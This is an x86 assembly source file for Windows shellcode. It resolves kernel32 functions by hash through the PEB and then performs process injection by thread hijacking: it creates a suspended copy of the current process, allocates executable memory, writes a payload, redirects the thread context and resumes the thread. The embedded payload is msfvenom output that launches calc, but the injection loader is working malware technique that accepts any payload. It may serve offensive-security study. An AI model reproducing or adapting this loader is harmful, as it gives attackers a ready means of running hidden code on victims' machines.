[SECTION .text]

BITS 32

_start:
    jmp main
    
    ; Constants
    win32_library_hashes:
        call win32_library_hashes_return
        ; LoadLibraryA
        dd 0xEC0E4E8E
        ; CreateProcessW - EBP + 0x08
		dd 0x16B3FE88
		; ExitProcess - EBP + 0x0C
		dd 0x73E2D87E
		; GetThreadContext - EBP + 0x10
		dd 0x68A7C7D2
		; VirtualAllocEx - EBP + 0x14
		dd 0x6E1A959C
		; WriteProcessMemory - EBP + 0x18
		dd 0xD83D6AA1
		; SetThreadContext - EBP + 0x1C
		dd 0xE8A7C7D3
		; ResumeThread - EBP + 0x20
		dd 0x9E4A3F88
    
    ; ======== Function: find_kernel32
    find_kernel32:
        push esi
        xor eax, eax
        mov eax, [fs:eax+0x30]
        mov eax, [eax+0x0C]
        mov esi, [eax+0x1C]
        mov esi, [esi]
        lodsd
        mov eax, [eax+0x08]
        pop esi
        ret
        
    ; ======= Function: find_function
    find_function:
        pushad
        mov ebp, [esp+0x24]
        mov eax, [ebp+0x3C]
        mov edx, [ebp+eax+0x78]
        add edx, ebp
        mov ecx, [edx+0x18]
        mov ebx, [edx+0x20]
        add ebx, ebp
    find_function_loop:
        jecxz find_function_finished
        dec ecx
        mov esi, [ebx+ecx*4]
        add esi, ebp
        
    compute_hash:
        xor edi, edi
        xor eax, eax
        cld
    compute_hash_again:
        lodsb
        test al, al
        jz compute_hash_finished
        ror edi, 0x0D
        add edi, eax
        jmp compute_hash_again
    compute_hash_finished:
    find_function_compare:
        cmp edi, [esp+0x28]
        jnz find_function_loop
        mov ebx, [edx+0x24]
        add ebx, ebp
        mov cx, [ebx+2*ecx]
        mov ebx, [edx+0x1C]
        add ebx, ebp
        mov eax, [ebx+4*ecx]
        add eax, ebp
        mov [esp+0x1C], eax
    find_function_finished:
        popad
        ret
        
    ; ======== Function: resolve_symbols_for_dll
    resolve_symbols_for_dll:
        lodsd
        push eax
        push edx
        call find_function
        mov [edi], eax
        add esp, 0x08
        add edi, 0x04
        cmp esi, ecx
        jne resolve_symbols_for_dll
    resolve_symbols_for_dll_finished:
        ret
        
    ; ======= Inject Code
    ; Payload   
    injected_code: 
    call injected_code_return  
    ; msfvenom -p windows/exec -a x86 --platform windows CMD=calc -f dword  
    ; No encoder specified, outputting raw payload  
    ; Payload size: 192 bytes  
    dd 0x0082e8fc 
    dd 0x89600000 
    dd 0x64c031e5 
    dd 0x8b30508b 
    dd 0x528b0c52 
    dd 0x28728b14 
    dd 0x264ab70f 
    dd 0x3cacff31 
    dd 0x2c027c61 
    dd 0x0dcfc120 
    dd 0xf2e2c701 
    dd 0x528b5752 
    dd 0x3c4a8b10 
    dd 0x78114c8b 
    dd 0xd10148e3 
    dd 0x20598b51 
    dd 0x498bd301 
    dd 0x493ae318 
    dd 0x018b348b 
    dd 0xacff31d6 
    dd 0x010dcfc1 
    dd 0x75e038c7 
    dd 0xf87d03f6 
    dd 0x75247d3b 
    dd 0x588b58e4 
    dd 0x66d30124 
    dd 0x8b4b0c8b 
    dd 0xd3011c58 
    dd 0x018b048b 
    dd 0x244489d0 
    dd 0x615b5b24 
    dd 0xff515a59 
    dd 0x5a5f5fe0 
    dd 0x8deb128b 
    dd 0x8d016a5d 
    dd 0x0000b285 
    dd 0x31685000 
    dd 0xff876f8b 
    dd 0xb5f0bbd5 
    dd 0xa66856a2 
    dd 0xff9dbd95 
    dd 0x7c063cd5 
    dd 0xe0fb800a 
    dd 0x47bb0575 
    dd 0x6a6f7213 
    dd 0xd5ff5300 
    dd 0x636c6163 
    dd 0x00000000 
    
    create_empty_structure:
		pop ebx
		xor eax, eax                        ; Zero EAX
		sub esp, ecx                        ; Allocate stack space for the two structures
		mov edi, esp                        ; set edi to point to the STARTUPINFO structure
		push edi                            ; Preserve EDI on the stack as it will be modified by the following instructions
		rep stosb                           ; Repeat storing zero at the buffer starting at edi until ecx is zero
		pop edi                             ; restore EDI to its original value
		push ebx
		ret

    perform_injection:
        ; Get current process ImagePathName
        mov eax, [fs:0x30]                  ; Store the address of the PEB structure in EAX 
        mov eax, [eax+0x10]                 ; Store the address of the _RTL_USER_PROCESS_PARAMETERS  
                                            ; structure in EAX 
        mov eax, [eax+0x3C]                 ; Store the address of the ImageProcessName value in EAX 
        mov [ebp+0x40], eax                 ; Store the address of the process path at EBP+0x40 to use later 
        
        ; Create & Initialize structures
        xor ecx, ecx
        mov cl, 0x54
        call create_empty_structure
        
        mov byte[edi], 0x44                 ; Set STARTUPINFOW.cb = 0x44
        
        ; Create a suspended process
        lea esi, [edi+0x44]                 ; Load the effective address of the PROCESS_INFORMATION structure into ESI
        push esi                            ; Push the pointer to the lpProcessInformation structure
        push edi                            ; Push the pointer to the lpStartupInfo structure
        push eax                            ; lpCurrentDirectory = NULL
        push eax                            ; lpEnvironment = NULL
        push 0x04                           ; dwCreationFlags = CREATE_SUSPENDED
        push eax                            ; bInheritHandles = FALSE
        push eax                            ; lpThreadAttributes = NULL
        push eax                            ; lpProcessAttributes = NULL
        push dword [ebp+0x40]               ; lpCommandLine = current process
        push eax                            ; lpApplicationName = NULL
        call [ebp+0x08]                     ; Call CreateProcessW
        
        ; Begin GetThreadContext
        sub esp, 0x0400                     ; Create 1024 bytes for CONTEXT object on stack
        push 0x010007                       ; CONTEXT ContextFlags = CONTEXT_FULL
        push esp                            ; lpContext
        push dword [esi+0x04]               ; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
        call [ebp+0x10]                     ; Call GetThreadContext

        ; Begin VirtualAllocEx
        push 0x40                           ; flProtect = PAGE_EXECUTE_READWRITE
        push 0x1000                         ; flAllocationType = MEM_COMMIT
        push 0x5000                         ; dwSize = 20kb
        push 0                              ; lpAddress = NULL
        push dword [esi]                    ; hProcess = PROCESS_INFORMATION.hProcess = ESI
        call [ebp+0x14]                     ; Call VirtualAllocEx

        ; Setup CONTEXT object for thread change
        mov [esp+0xB8], eax                 ; CONTEXT object offset 0xB8 = EIP
        
        ; Begin WriteProcessMemory
        push 0                              ; lpNumberOfBytesWritten = NULL
        push 0x0C0                          ; nSize = 0x0C0 = 192 bytes 
        jmp long injected_code              ; jump to the stored code 
        injected_code_return:               ; lpBuffer = return address pushed to the stack
        push eax                            ; lpBaseAddress = EAX
        push dword [esi]                    ; hProcess = PROCESS_INFORMATION.hProcess = ESI
        call [ebp+0x18]                     ; Call WriteProcessMemory

        ; Begin SetThreadContext
        push esp                            ; lpContext = CONTEXT structure
        push dword [esi+0x04]               ; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
        call [ebp+0x1C]                     ; Call SetThreadContext

        ; Begin ResumeThread
        push dword [esi+0x04]               ; hThread = PROCESS_INFORMATION.hThread = ESI+0x04
        call [ebp+0x20]                     ; Call ResumeThread

        ; Begin TerminateProcess
        call [ebp+0x0C]
    
    main:
        sub esp, 0x88                       ; Allocate space on stack for function addresses
        mov ebp, esp                        ; Set ebp as frame ptr for relative offset on stack
        call find_kernel32                  ; Find base address of kernel32.dll
        mov edx, eax                        ; Store base address of kernel32.dll in EDX
        jmp long win32_library_hashes
        win32_library_hashes_return:
        pop esi
        lea edi, [ebp+0x04]                 ; This is where we store our function addresses
        mov ecx, esi
        add ecx, 0x20                       ; Length of kernel32 hash list
        call resolve_symbols_for_dll
        call perform_injection
